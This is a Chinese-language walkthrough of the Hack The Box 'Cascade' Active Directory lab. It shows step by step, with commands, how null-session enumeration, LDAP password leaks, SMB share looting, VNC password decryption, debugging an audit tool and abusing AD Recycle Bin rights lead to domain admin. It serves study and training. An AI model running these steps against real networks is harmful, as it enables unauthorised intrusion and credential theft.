## AD-Cascade

### 0x00 前言

本小白最近在学域渗透，决定把Hack The Box的Active Directory 101
系列域渗透靶机打完，并详细记录当中用到的工具、知识点及其背后的原理。本篇文章是该系列的第八篇，靶机名字为Cascade。

### 0x01 信息搜集

    
    
    Nmap scan report for 10.10.10.182
    Host is up (0.23s latency).
    Not shown: 65520 filtered ports
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid: 
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-29 03:19:33Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49170/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: -1s
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-11-29T03:20:40
    |_  start_date: 2022-11-29T01:11:22
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1282.33 seconds
    

从上面nmap扫描结果中我们可以提取到一个域名：cascade.local

接下来上市rpc空连接，发现可以连上，并且成功枚举得到了很多用户名

    
    
    rpcclient -U '' -N 10.10.10.182
    

![图片.png](https://image.3001.net/images/20221202/1669991353_638a0bb9de573e555aefd.png!small)

    
    
    CascGuest
    arksvc
    s.smith]
    r.thompson
    util
    j.wakefield
    s.hickson
    j.goodhand
    a.turnbull
    e.crowe
    b.hanson
    d.burman
    BackupSvc
    j.allen
    i.croft
    

尝试使用ldapsearch进行信息搜集

    
    
    ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 >result.txt
    ldapsearch -x -b "DC=cascade,DC=local" '(objectClass=person)' -H ldap://10.10.10.182 > ldap-people.txt
    

![图片.png](https://image.3001.net/images/20221202/1669991364_638a0bc4a0ddcb84a380c.png!small)

成功在搜集的结果中找到了r.thompson用户的密码

    
    
    echo clk0bjVldmE= |base64 -d
    #得到用户r.thompson的密码：rY4n5eva
    
    
    
    crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
    

测试发现无法通过winrm远程登录

![图片.png](https://image.3001.net/images/20221202/1669991383_638a0bd710dc66bf3baaa.png!small)

查看r.thompson可以访问的SMB目录

    
    
    crackmapexec smb 10.10.10.182 -u "r.thompson" -p "rY4n5eva" --shares
    

![图片.png](https://image.3001.net/images/20221202/1669991392_638a0be071b4352db7202.png!small)

以r.thompson用户身份访问Data目录，并将Data目录下的所有文件下载到本地

    
    
    smbclient --user r.thompson //10.10.10.182/data rY4n5eva            #以r.thompson用户身份访问Data目录
    smb: \> mask ""
    smb: \> recurse ON            #默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON
    smb: \> prompt OFF            #默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF
    smb: \> mget *                #此时可以在不询问的情况下递归下载data目录下的所有文件
    

### 0x02 破解TightVNC密码

在本地查看Data目录下下载的文件，在IT/Temp/s.smith目录的Install.reg文件中找到了一个vnc密码

![图片.png](https://image.3001.net/images/20221202/1669991406_638a0bee807a370804bc7.png!small)

我知道这个密码是被加密过后的而并非明文，所以我尝试用Google搜索解密方法，并且找到了一个可以用于解密VNC密码的工具

![图片.png](https://image.3001.net/images/20221202/1669991415_638a0bf754f90ea40497d.png!small)

    
    
    #https://github.com/jeroennijhof/vncpwd            					  #vnc密码解密工具
    echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass			
    gcc -o vncpwd vncpwd.c d3des.c
    chmod 777 vncpwd
    ./vncpwd vnc_enc_pass
    #我们也可以只使用 Bash 技巧将命令输出视为文件的内容<( )：
    ./vncpwd <(echo '6bcf2a4b6e5aca0f' | xxd -r -p)
    

![图片.png](https://image.3001.net/images/20221202/1669991426_638a0c024013873a57e66.png!small)

此时我们获得了一个密码，我猜测它可能是s.smith用户的密码，不过我并没有急着去尝试，我又在如下的文件中，发现了一封邮件，从邮件中，可以获取到的有效信息是，存在一个临时账户TempAdmin并且密码和正常的管理员账户是同一个，那么我们在接下来的渗透过程中也可以注意这个账号

    
    
    root@kali2020:~/IT/Email Archives# cat Meeting_Notes_June_2018.html 
    <html>
    <body lang=EN-GB link=blue vlink=purple style='tab-interval:36.0pt'>
    <div class=WordSection1>
    ···
    ···
    ···
    <p>-- We will be using a temporary account to
    perform all tasks related to the network migration and this account will be deleted at the end of
    2018 once the migration is complete. This will allow us to identify actions
    related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
    <p>-- The winner of the �Best GPO� competition will be
    announced on Friday so get your submissions in soon.</p>
    
    ···
    ···
    ···
    
    </div>
    </body>
    </html>
    

通过使用crackmapexec测试发现的确可以使用密码：sT333ve2通过winRM用s.smith账号进行远程登录

    
    
    crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
    

![图片.png](https://image.3001.net/images/20221202/1669991438_638a0c0e0802540dd4af3.png!small)

    
    
    evil-winrm -u s.smith -p 'sT333ve2' -i 10.10.10.182
    

![图片.png](https://image.3001.net/images/20221202/1669991445_638a0c150796caab69242.png!small)  
成功登录到s.smith用户后，发现该用户属于Audit Share组

![图片.png](https://image.3001.net/images/20221202/1669991452_638a0c1c82279f95c11ae.png!small)  
由于Audit Share组并非windows经典的权限组，所以我又查看了该组的成员发现只有该用户  
![图片.png](https://image.3001.net/images/20221202/1669991466_638a0c2a92fbc533faec6.png!small)

那么接下来我使用以下命令将s.smith用户可以访问的Audit目录下的所有文件下载到本地并进行挨个查看

    
    
    smbclient --user s.smith //10.10.10.182/Audit$ sT333ve2
    smb: \> mask ""
    smb: \> recurse ON            #默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON
    smb: \> prompt OFF            #默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF
    smb: \> mget *                #此时可以在不询问的情况下递归下载data目录下的所有文件
    getting file \CascAudit.exe of size 13312 as CascAudit.exe (191.2 KiloBytes/sec) (average 191.2 KiloBytes/sec)
    getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (206.9 KiloBytes/sec) (average 198.4 KiloBytes/sec)
    getting file \DB\Audit.db of size 24576 as Audit.db (461.5 KiloBytes/sec) (average 275.3 KiloBytes/sec)
    getting file \RunAudit.bat of size 45 as RunAudit.bat (0.8 KiloBytes/sec) (average 213.2 KiloBytes/sec)
    getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (3317.8 KiloBytes/sec) (average 1198.9 KiloBytes/sec)
    getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (356.4 KiloBytes/sec) (average 690.9 KiloBytes/sec)
    getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (4411.8 KiloBytes/sec) (average 1805.3 KiloBytes/sec)
    getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (4629.3 KiloBytes/sec) (average 2308.8 KiloBytes/sec)
    

### 0x03 审计SQLlite数据库

我首先看到的是`DB\Audit.db`这是一个 SQLite3 数据库：

![图片.png](https://image.3001.net/images/20221202/1669991695_638a0d0f0ad7cd8648632.png!small)

我认为该`Ldap`表可能有密码，但 base64 编码的数据没有解码为 ASCII。也许它以某种方式加密。

### 0x04 CascAudit.exe的调试

`RunAudit.bat`显示`CascAudit.exe`以 db 文件作为参数运行

    
    
    root@kali2020# cat RunAudit.bat 
    CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
    

接下来我们把CascAudit.exe和Audit.db放到window中进行查看，我们在 MailModule 中发现有这样的代码：

    
    
    namespace CascAudiot
    {
      // Token: 0x02000008 RID: 8
      [StandardModule]
      internal sealed class MainModule
      {
        // Token: 0x0600000F RID: 15 RVA: 0x00002128 File Offset: 0x00000328
        [STAThread]
        public static void Main()
        {
          if (MyProject.Application.CommandLineArgs.Count != 1)
          {
            Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
            return;
          }
          checked
          {
            using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
            {
              string str = string.Empty;
              string password = string.Empty;
              string str2 = string.Empty;
              try
              {
                sqliteConnection.Open();
                using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
                {
                  using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
                  {
                    sqliteDataReader.Read();
                    str = Conversions.ToString(sqliteDataReader["Uname"]);
                    str2 = Conversions.ToString(sqliteDataReader["Domain"]);
                    string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
                    try
                    {
                      password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
                    }
                    catch (Exception ex)
                    {
                      Console.WriteLine("Error decrypting password: " + ex.Message);
                      return;
                    }
                  }
                }
                sqliteConnection.Close();
              }
              catch (Exception ex2)
              {
                Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
                return;
              }
    ...[snip]...
    

我决定通过调试恢复明文密码。我在 SQL 连接关闭的第 53 行放置了一个断点。然后我去 Debug -> Start Debugging...，并将
Arugument 设置到我有一份副本的地方`Audit.db`

![图片.png](https://image.3001.net/images/20221202/1669991710_638a0d1ece1040cc521b4.png!small)

点击 OK 后，它运行到断点，我可以在 Locals 窗口中看到解密的密码：

![图片.png](https://image.3001.net/images/20221202/1669991716_638a0d2448532a81cd96c.png!small)

根据 SQLite 数据库中的行，此密码`w3lc0meFr31nd`可能与帐户 arksvc 配对。

`crackmapexec`表明不仅密码有效，而且会提供一个 WinRM shell：

    
    
    crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
    

![图片.png](https://image.3001.net/images/20221202/1669991725_638a0d2d9e9823bae310d.png!small)

    
    
    evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
    

### 0x05 AD Recycle Bin权限的滥用

`AD Recycle Bin`是一个著名的 Windows 组。[Active Directory
对象恢复（或回收站）](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)是 Server 2008 中添加的一项功能，允许管理员恢复已删除的项目，就像回收站对文件所做的一样。链接的文章提供了一个
PowerShell 命令来查询域中所有已删除的对象：

![图片.png](https://image.3001.net/images/20221202/1669991736_638a0d382a9817e1f2927.png!small)

    
    
    Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
    

最后一条比较有意思，因为它是我之前找到的旧电子邮件中提到的临时管理员帐户（之前我们发现的那封邮件还提到了TempAdmin用户使用了与正常管理员帐户相同的密码）。

![图片.png](https://image.3001.net/images/20221202/1669991744_638a0d40027f548d8007e.png!small)

我可以获得该帐户的所有详细信息：

    
    
    Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
    

![图片.png](https://image.3001.net/images/20221202/1669991752_638a0d4884eca0dd88e2e.png!small)

我们发现了该用户的密码，尝试解密后成功得到了TempAdmin用户的密码

    
    
    YmFDVDNyMWFOMDBkbGVz
    echo YmFDVDNyMWFOMDBkbGVz | base64 -d
    

crackmapexec查看发现得到的密码可以通过winrm远程登录到admin用户

    
    
    crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
    evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182
    

![图片.png](https://image.3001.net/images/20221202/1669991763_638a0d539bf3d8effdd8a.png!small)

![图片.png](https://image.3001.net/images/20221202/1669991769_638a0d59c648957446db7.png!small)  
至此，我们已经拿到了域管权限，这台靶机的渗透到这里就结束了。

### 0x06 总结

首先我们通过ldap进行信息搜集，发现了r.thompson用户的密码，通过访问r.thompson用户可以查看的SMB共享，我们获得了一封邮件以及用户s.smith用户的VNC密码（被加密了），后续我们通过Google找到了可以破解该密码的工具并成功得到
s.smith用户的密码，又通过该用户可以访问的SMB共享，得到了一个SQLlite数据库文件，通过访问该数据库文件发现了arksvc用户的密码，但是该密码被加密了，后面我们通过RunAudit.bat，发现了Audit.db与CascAudit.exe的关系，接着在windows环境下，通过下断点的方式调试，得到了arksvc用户的密码，然后通过该用户的AD
Recycle
Bin组的权限，成功恢复并得到了被删除的TempAdmin用户的密码，又由于前面邮件中提到的，该用户的密码与admin用户的密码一致，最终通过evil-winrm远程登录拿到了域管的shell。

